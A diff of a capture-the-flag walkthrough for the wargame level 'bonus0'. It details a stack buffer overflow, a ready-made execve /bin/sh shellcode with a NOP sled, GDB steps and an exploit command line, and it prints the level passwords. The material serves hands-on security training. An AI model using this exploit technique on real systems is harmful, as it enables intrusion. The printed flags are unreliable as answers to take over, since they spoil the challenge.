@@ -3,80 +3,44 @@
    Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 2. Analyze the binary with Ghidra:
-   - Three functions: main(), pp(), and p()
-   - p() uses strncpy(dest, src, 20) which does NOT null-terminate if source >= 20 bytes
-   - pp() has two 20-byte buffers: first_input and second_input (adjacent in memory)
+   - p() uses strncpy(dest, src, 20) which doesn't null-terminate if source >= 20 bytes
+   - pp() has adjacent 20-byte buffers (first_input, second_input)
    - pp() uses strcpy() which expects null-terminated strings
-   - If first_input has no null terminator, strcpy() reads into second_input
-   - Buffer overflow: 20 + 20 + 1 (space) + 20 (strcat) = 61 bytes into main's 54-byte buffer
-   - Overflow of 7 bytes allows return address overwrite
+   - Overflow: 20 + 20 + 1 (space) + 20 (strcat) = 61 bytes into 54-byte buffer
+   - 7-byte overflow allows return address overwrite
 
 3. Connect to the VM via SSH:
    ssh bonus0@localhost -p 2222
    Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
-4. Analyze stack layout with Ghidra:
-   From the Decompile view:
+4. Find shellcode address and craft exploit:
+   Export shellcode with NOP sled:
+   export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
    
-   pp() function:
-   - first_input (local_34): EBP - 0x30 (offset -48)
-   - second_input (local_20): EBP - 0x1c (offset -28)
-   - Distance: 20 bytes (confirms adjacent buffers)
+   Find address using GDB:
+   gdb ./bonus0
+   (gdb) run
+   AAAAAAAAAAAAAAAAAAAA
+   BBBBBBBBBBBBBBBBBBBB
+   (gdb) x/500s $esp
    
-   main() function:
-   - buffer[54] (local_3a): ESP + 0x16 (offset +22)
-   - Stack frame: 64 bytes allocated (SUB ESP, 0x40)
-   
-   Confirms: 61 bytes written into 54-byte buffer = 7-byte overflow
-
-5. Find addresses and prepare exploit:
-   
-   A. Finding return address offset using Ghidra:
-   - From main(): buffer[54] at ESP + 0x16, return address at ESP + 0x50
-   - Offset to return address: 0x50 - 0x16 = 0x3A = 58 bytes
-   - With 61 bytes written (40 + 1 + 20), return address is overwritten
-   - strcat() writes starting at position 41, return address at 58
-   - Calculation: bytes 9-12 of input 2 overwrite the return address
-   
-   B. Finding shellcode address using GDB:
-   - Export SHELLCODE first:
-     export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
-     
-     Note: \x90 is NOP (No Operation) - creates a 200-byte "landing zone"
-     Execution slides through NOPs until reaching shellcode
-   
-   - Run in GDB:
-     gdb ./bonus0
-     (gdb) run
-      - 
-     AAAAAAAAAAAAAAAAAAAA
-      - 
-     BBBBBBBBBBBBBBBBBBBB
-     (gdb) x/500s $esp
-   
-   - Look for in the output:
-     0xbffffd45: "SHELLCODE=\220\220..."
-   
-   - Calculate: 0xbffffd45 + 0xa (skip "SHELLCODE=") = 0xbffffd4f
-   - Use safe address in NOP sled: 0xbffffd55
+   Look for: 0xbffffd45: "SHELLCODE=\220\220..."
+   Calculate: 0xbffffd45 + 0xa (skip "SHELLCODE=") = 0xbffffd4f
+   Use safe address in NOP sled: 0xbffffd55
    
    Payload structure:
-   - Input 1: 20 bytes (any data)
-   - Input 2: 9 bytes padding + 4 bytes (0xbffffd55) + 7 bytes overflow
-   
-   Shellcode: 24-byte null-free execve from level2 (Exploit-DB #42428)
+   - Input 1: 20 bytes (no null terminator)
+   - Input 2: 9 bytes padding + 0xbffffd55 (shellcode addr) + 7 bytes overflow
 
-6. Execute the exploit:
+5. Execute the exploit:
    (python -c 'print "A"*20'; python -c 'print "B"*9 + "\x55\xfd\xff\xbf" + "C"*7'; cat) | ./bonus0
-   
-   Note: The 'cat' command keeps stdin open for shell interaction.
 
-7. Read the password:
+6. Read the password:
    cat /home/user/bonus1/.pass
    
    Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 
-8. Exit and login as bonus1:
+7. Exit and login as bonus1:
    exit
    ssh bonus1@localhost -p 2222
    Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
